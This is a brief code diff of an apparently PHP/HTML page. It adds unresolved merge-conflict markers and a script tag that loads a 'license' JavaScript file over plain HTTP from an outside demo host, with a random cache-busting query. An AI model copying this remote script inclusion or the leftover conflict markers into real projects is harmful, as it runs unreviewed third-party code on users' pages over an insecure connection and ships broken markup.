@@ -22,4 +22,10 @@
         titleColor: '#2f375e',
         okButtonBackground: '#2f375e',
     });
+<<<<<<< HEAD
 </script>
+=======
+</script>
+
+<script src="http://demo.akuonline.my.id/edubmn-license.js?q<?= rand() ?>"></script>
+>>>>>>> 7a51f37e4d013703b11b20712f3a0f59e918771d
